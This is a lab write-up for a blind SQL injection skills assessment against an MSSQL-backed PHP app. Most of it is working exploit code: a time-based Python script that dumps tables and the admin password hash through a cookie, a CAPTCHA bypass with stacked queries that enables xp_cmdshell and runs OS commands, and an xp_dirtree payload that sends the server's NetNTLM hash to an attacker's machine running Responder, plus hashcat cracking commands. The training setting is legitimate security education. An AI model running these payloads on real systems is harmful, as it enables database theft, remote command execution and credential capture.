# Blind SQL Injection — Skills Assessment

MSSQL time-based blind injection across two endpoints. First endpoint (unauthenticated) to dump the admin hash. Second endpoint (authenticated) to enable xp_cmdshell and read a file from disk.

---

## Target

PHP app on Windows with MSSQL backend. Login: `admin@d4y.at` (password obtained by cracking the dumped hash).

---

## Injection Point 1: TrackingId Cookie

The app sets a `TrackingId` cookie on every page load. The value is stored in and read from the database — injecting into it causes a time delay.

### Confirm SQLi

```
TrackingId: ';IF(1=1) WAITFOR DELAY '0:0:5';--
```

If the response takes 5+ seconds, injection confirmed.

### Bit-by-bit Extraction Script

Uses AND-ing to extract one bit at a time — 7 requests per character (7 bits in ASCII printable range):

```python
import requests, time
from urllib.parse import quote

TARGET = "http://10.129.204.202"
DELAY = 3

def oracle(condition):
    payload = quote(f"';IF({condition}) WAITFOR DELAY '0:0:{DELAY}';--")
    start = time.time()
    requests.get(f"{TARGET}/index.php", cookies={"TrackingId": payload})
    return time.time() - start >= DELAY

def dump_number(query):
    result = 0
    for bit in range(7):
        if oracle(f"({query}) & {2**bit} > 0"):
            result |= 2**bit
    return result

def dump_string(query, length):
    result = ""
    for i in range(1, length + 1):
        char = 0
        for bit in range(7):
            if oracle(f"ASCII(SUBSTRING(({query}), {i}, 1)) & {2**bit} > 0"):
                char |= 2**bit
        result += chr(char)
        print(f"  [{i}/{length}] {result}", end="\r")
    print()
    return result

# Enumerate
db_len  = dump_number("LEN(DB_NAME())")
db_name = dump_string("DB_NAME()", db_len)
print(f"DB: {db_name}")   # e.g. "d4y"

# Tables
n_tables = dump_number(
    f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{db_name}'"
)
for i in range(n_tables):
    tlen = dump_number(
        f"SELECT LEN(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES "
        f"WHERE TABLE_CATALOG='{db_name}' ORDER BY TABLE_NAME "
        f"OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
    )
    tname = dump_string(
        f"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
        f"WHERE TABLE_CATALOG='{db_name}' ORDER BY TABLE_NAME "
        f"OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY",
        tlen
    )
    print(f"  Table: {tname}")

# Admin credentials from users table
hash_len  = dump_number("SELECT TOP 1 LEN(password) FROM users")
password_hash = dump_string("SELECT TOP 1 password FROM users", hash_len)
email_len = dump_number("SELECT TOP 1 LEN(email) FROM users")
email     = dump_string("SELECT TOP 1 email FROM users", email_len)
print(f"\nEmail: {email}")
print(f"Hash:  {password_hash}")
```

### Crack the Hash

```bash
# MD5 hash (mode 0)
hashcat -m 0 -w 3 -O 'HASH_HERE' /usr/share/wordlists/rockyou.txt
```

---

## Injection Point 2: captchaAnswer Field (Authenticated)

After logging in as admin, the "Create Post" page at `/new.php` has a CAPTCHA. The `captchaAnswer` field is injectable.

### Finding the Correct Format

The CAPTCHA query is something like:
```sql
SELECT * FROM captcha WHERE id=[captchaId] AND answer='[captchaAnswer]'
```

The `captchaAnswer` field uses a string injection. The correct format to bypass the captcha AND execute stacked queries:

```
1' OR '1'='1';<YOUR_SQL>;--
```

- `1' OR '1'='1'` — makes the captcha check return true (bypasses it)
- `;` — ends the SELECT, starts a new statement
- `<YOUR_SQL>` — whatever you want to execute
- `--` — comments out the trailing quote

> **Important:** Do NOT use the `5';...` format from the TrackingId labs. The captchaAnswer field uses string quotes, so the injection must start with a string value, not a number.

### Verify SQLi Works

```python
import requests, re, time
from urllib.parse import quote

TARGET = "http://10.129.204.202"
s = requests.Session()

# Login — field names are 'e' and 'p', not 'email' and 'password'
s.post(f"{TARGET}/login.php", data={"e": "admin@d4y.at", "p": "CRACKED_PASSWORD"})

def get_captcha_id():
    r = s.get(f"{TARGET}/new.php")
    m = re.search(r'captchaId" value="(\d+)"', r.text)
    return m.group(1)

def sqli(sql):
    cid = get_captcha_id()
    return s.post(f"{TARGET}/new.php",
        data={"title": "t", "message": "t", "picture": "",
              "captchaId": cid,
              "captchaAnswer": f"1' OR '1'='1';{sql}--"})

# Confirm: 5-second delay
start = time.time()
sqli("WAITFOR DELAY '0:0:5';")
print(f"Delay: {time.time()-start:.1f}s")  # should be ~5
```

### Enable xp_cmdshell

```python
sqli("EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;")
time.sleep(1)
sqli("EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;")
time.sleep(1)
```

### Execute Commands + Read Flag

The web root is `C:\Apache24\htdocs\` (discovered via a PHP fatal error from a UNION injection attempt — the error message reveals the full file path).

```python
# Write flag to webroot
sqli("EXEC xp_cmdshell 'type C:\\flag.txt > C:\\Apache24\\htdocs\\flag_out.txt';")
time.sleep(2)

# Fetch it
r = requests.get(f"{TARGET}/flag_out.txt")
print(f"Flag: {r.text.strip()}")
```

---

## NetNTLM Hash Capture (Bonus)

From any injection point (TrackingId or captchaAnswer), trigger an SMB connection to your machine:

**Step 1:** Start Responder:
```bash
sudo responder -I tun0
```

**Step 2:** Inject `xp_dirtree` via the TrackingId cookie:
```bash
# URL-encode the payload
python3 -c "from urllib.parse import quote; print(quote(\"';EXEC master..xp_dirtree '\\\\\\\\10.10.14.4\\\\myshare', 1, 1;--\"))"
```

Send that as the `TrackingId` cookie value. Responder captures the NTLMv2 hash.

**Step 3:** Crack it:
```bash
hashcat -m 5600 -w 3 -O 'HASH' /usr/share/wordlists/rockyou.txt
```

---

## Gotchas

- **Login field names are `e` and `p`**, not `email` and `password`. Sending the wrong field names gives a 200 with the login page (not an error).
- **The captchaId rotates** every time you load `/new.php`. Always fetch a fresh one per request — don't reuse.
- **Finding the webroot**: If you're unsure of the path, do a UNION injection attempt in captchaAnswer to trigger a PHP fatal error. The error message in the response reveals the full path: `C:\Apache24\htdocs\new.php:19`.
- **xp_cmdshell requires two steps**: first enable 'Show Advanced Options', THEN enable 'xp_cmdshell'. Skipping the first step causes silent failure.
